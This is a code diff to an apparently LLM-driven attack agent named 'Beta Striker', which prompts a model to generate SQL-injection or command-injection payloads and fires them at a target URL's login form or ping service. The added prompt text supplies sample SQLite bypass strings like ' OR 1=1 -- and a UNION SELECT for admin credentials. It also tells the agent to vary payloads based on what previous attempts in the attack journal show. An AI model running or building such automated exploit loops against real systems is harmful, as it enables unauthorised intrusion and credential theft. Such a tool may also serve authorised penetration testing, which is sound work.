@@ -1,20 +1,29 @@
 from .llm_client import call_groq
 from tools.http_exploit import fire_payload
+from tracing import trace
 
-async def run_beta(target_url, vuln_type, alpha_results, journal, broadcast_fn) -> dict:
+@trace(name="Beta Striker")
+async def run_beta(target_url, vuln_type, alpha_results, journal, broadcast_fn, trace_context=None) -> dict:
+    from tracing import trace_step
+    
     context = journal.get_context_string()
     recon_data = "\n".join(alpha_results)
     
     prompt = f"""You are Beta, the Striker agent.
+TARGET ENDPOINT CONTEXT:
+- Database: SQLite
+- If {vuln_type} is 'sqli': You are attacking a LOGIN FORM (POST request). The payload is injected into the 'username' STRING field.
+- If {vuln_type} is 'cmdi': You are attacking a PING SERVICE (POST request). The payload is injected into the 'host' field.
+
 ATTACK JOURNAL (everything tried so far — do NOT repeat any of these):
 {context}
 
 RECON INTELLIGENCE:
 {recon_data[:4000]}
 
-Your task: Based on the recon intelligence and the attack journal showing what has ALREADY FAILED, generate exactly ONE new payload to try for {vuln_type}.
-The payload must be meaningfully different from all failed attempts. 
-Output ONLY the raw payload string, nothing else — no explanation, no quotes, just the payload."""
+Your task: Generate exactly ONE new, high-bypass SQLite payload to try for {vuln_type}.
+For SQLi, use string-based bypasses like "' OR 1=1 --" or "' UNION SELECT 'admin','password' --".
+Output ONLY the raw payload string."""
 
     messages = [
         {"role": "system", "content": prompt}
@@ -25,7 +34,13 @@ Output ONLY the raw payload string, nothing else — no explanation, no quotes, 
     payload = payload.strip().strip('"').strip("'")
     
     await broadcast_fn(f"Firing payload → {payload}", "Beta", "info")
-    response = await fire_payload(target_url, vuln_type, payload)
+    
+    if trace_context:
+        span_id = trace_step(trace_context["workflow_id"], "HTTP_EXPLOIT", trace_context["parent_id"], {"payload": payload}, "running")
+        response = await fire_payload(target_url, vuln_type, payload, {"workflow_id": trace_context["workflow_id"], "parent_id": span_id})
+        trace_step(trace_context["workflow_id"], "HTTP_EXPLOIT", trace_context["parent_id"], {"status_code": response["status_code"]}, "success")
+    else:
+        response = await fire_payload(target_url, vuln_type, payload)
     
     await broadcast_fn(f"Response received — Status {response['status_code']}", "Beta", "info")
     return {"payload": payload, "response": response}
